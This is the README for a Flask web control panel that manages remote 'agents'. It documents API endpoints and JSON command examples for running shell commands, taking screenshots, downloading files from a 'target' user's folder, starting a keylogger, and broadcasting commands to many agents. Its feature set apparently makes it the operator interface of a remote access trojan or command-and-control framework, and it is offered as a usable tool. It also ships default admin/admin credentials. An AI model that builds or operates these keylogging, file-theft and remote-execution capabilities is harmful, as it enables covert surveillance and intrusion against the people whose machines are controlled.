# Web UI for Remote System Control

This directory contains the web-based control interface for managing remote agents.

## Overview

The web UI provides a browser-based interface for:
- Viewing active agents and their status
- Executing commands on agents
- Viewing command history
- Capturing screenshots
- Managing multiple agents simultaneously

**Requirements Implemented:** 11.1, 11.2, 11.3, 11.4, 11.5, 11.6, 11.7, 11.8

## Architecture

### Backend (REST API)
- **File:** `rest_api.py`
- **Framework:** Flask
- **Port:** 8080 (default)
- **Authentication:** HTTP Basic Auth

### Frontend (Static Files)
- **Directory:** `static/`
- **Technology:** Vanilla JavaScript, HTML5, CSS3
- **Files:**
  - `index.html` - Main HTML structure
  - `styles.css` - Styling and layout
  - `app.js` - Application logic and API integration

## Features

### 1. Authentication (Requirement 11.8)
- Login page with username/password
- HTTP Basic Authentication
- Session management using sessionStorage
- Default credentials: `admin` / `admin`

### 2. Agent List View (Requirement 11.2)
- Grid display of all connected agents
- Real-time status indicators (online/offline)
- System information preview
- Auto-refresh every 5 seconds
- Click to view agent details

### 3. Agent Detail View (Requirements 11.3, 11.4, 11.5)
- Comprehensive system information
- Command execution interface
- Plugin selection (executor, screenshot, file_transfer, keylogger, systeminfo)
- Command result display
- Screenshot viewer modal

### 4. Command History (Requirements 11.4, 11.6)
- Chronological list of executed commands
- Filter/search functionality
- Status indicators (success/error)
- Execution timestamps
- Result preview

### 5. Multi-Agent Management (Requirement 11.7)
- Broadcast commands to multiple agents
- Select specific agents or all agents
- Aggregated results display

## Usage

### Starting the Web UI

```python
from remote_system.enhanced_server.enhanced_server import EnhancedServer
from remote_system.web_ui.rest_api import RESTAPIServer

# Create enhanced server
server = EnhancedServer(
    host="0.0.0.0",
    port=9999,
    db_path="./remote_system.db",
    use_tls=True
)

# Create REST API server
api_server = RESTAPIServer(
    core_server=server,
    port=8080,
    web_username="admin",
    web_password="admin"
)

# Start both servers
server.start()
api_server.start()
```

### Accessing the Web UI

1. Open browser and navigate to: `http://localhost:8080`
2. Login with credentials (default: admin/admin)
3. View agent list on dashboard
4. Click an agent to view details and execute commands

## API Endpoints

### Authentication Required

All endpoints except `/api/health` require HTTP Basic Authentication.

### Endpoints

#### `GET /api/agents`
Returns list of all active agents.

**Response:**
```json
{
  "success": true,
  "agents": [
    {
      "agent_id": "uuid",
      "hostname": "hostname",
      "username": "user",
      "os_type": "Windows",
      "os_version": "10",
      "ip_address": "192.168.1.100",
      "mac_address": "00:11:22:33:44:55",
      "status": "online",
      "connected_at": "2024-01-01T00:00:00",
      "last_seen": "2024-01-01T00:05:00"
    }
  ],
  "count": 1
}
```

#### `POST /api/agents/<agent_id>/command`
Send command to specific agent.

**Request:**
```json
{
  "command": {
    "plugin": "executor",
    "action": "execute",
    "args": {
      "command": "dir"
    }
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command queued successfully",
  "agent_id": "uuid"
}
```

#### `GET /api/agents/<agent_id>/history?limit=100`
Retrieve command history for agent.

**Response:**
```json
{
  "success": true,
  "agent_id": "uuid",
  "history": [
    {
      "log_id": "log-uuid",
      "agent_id": "agent-uuid",
      "command": {"plugin": "executor", "args": {"command": "dir"}},
      "result": "Directory listing...",
      "status": "success",
      "executed_at": "2024-01-01T00:01:00",
      "execution_time": 0.5
    }
  ],
  "count": 1
}
```

#### `GET /api/agents/<agent_id>/screenshot?quality=85&format=PNG`
Request screenshot from agent.

**Response:**
```json
{
  "success": true,
  "message": "Screenshot command queued",
  "agent_id": "uuid",
  "note": "Screenshot will be available in command history"
}
```

#### `POST /api/agents/broadcast`
Broadcast command to multiple agents.

**Request:**
```json
{
  "command": {
    "plugin": "executor",
    "args": {"command": "whoami"}
  },
  "agent_ids": ["uuid1", "uuid2"]
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command broadcast to 2 agents",
  "results": {
    "uuid1": "queued",
    "uuid2": "queued"
  },
  "queued_count": 2,
  "total_count": 2
}
```

#### `GET /api/health`
Health check endpoint (no authentication required).

**Response:**
```json
{
  "success": true,
  "status": "healthy",
  "timestamp": "2024-01-01T00:00:00"
}
```

## Command Examples

### Execute Shell Command
```json
{
  "command": {
    "plugin": "executor",
    "action": "execute",
    "args": {
      "command": "whoami"
    }
  }
}
```

### Capture Screenshot
```json
{
  "command": {
    "plugin": "screenshot",
    "action": "capture",
    "args": {
      "quality": 85,
      "format": "PNG"
    }
  }
}
```

### File Transfer
```json
{
  "command": {
    "plugin": "file_transfer",
    "action": "download",
    "args": {
      "remote_path": "C:\\Users\\target\\document.pdf",
      "local_path": "./downloads/document.pdf"
    }
  }
}
```

### Keylogger Control
```json
{
  "command": {
    "plugin": "keylogger",
    "action": "start",
    "args": {
      "buffer_size": 1000
    }
  }
}
```

## Security Considerations

1. **Authentication:** Always use strong passwords in production
2. **HTTPS:** Deploy behind reverse proxy with TLS in production
3. **CORS:** Configure CORS appropriately for your environment
4. **Rate Limiting:** Consider adding rate limiting for production
5. **Session Management:** Sessions stored in sessionStorage (cleared on tab close)

## Customization

### Changing Default Credentials
```python
api_server = RESTAPIServer(
    core_server=server,
    port=8080,
    web_username="your_username",
    web_password="your_secure_password"
)
```

### Changing Port
```python
api_server = RESTAPIServer(
    core_server=server,
    port=8888,  # Custom port
    web_username="admin",
    web_password="admin"
)
```

### Customizing Auto-Refresh Interval
Edit `app.js` and modify the `startAutoRefresh()` method:
```javascript
this.refreshInterval = setInterval(() => {
    this.loadAgents();
    if (this.currentAgentId) {
        this.loadHistory();
    }
}, 10000); // Change to 10 seconds
```

## Testing

Run integration tests:
```bash
python -m pytest tests/test_web_ui_integration.py -v
```

## Browser Compatibility

- Chrome 90+
- Firefox 88+
- Safari 14+
- Edge 90+

## Troubleshooting

### Web UI not loading
- Check that REST API server is running
- Verify port 8080 is not blocked by firewall
- Check browser console for errors

### Authentication failing
- Verify credentials are correct
- Check that HTTP Basic Auth is enabled
- Clear browser cache and sessionStorage

### Agents not appearing
- Verify enhanced server is running
- Check that agents are connected
- Verify database connection is working
- Check browser console for API errors

### Commands not executing
- Verify agent is online
- Check command format is correct
- Review command history for error messages
- Check server logs for errors

## Future Enhancements

Potential improvements for future versions:
- WebSocket support for real-time updates
- File upload/download through web UI
- Advanced filtering and search
- Dashboard with metrics and charts
- User management and role-based access
- Command templates and favorites
- Bulk operations on multiple agents
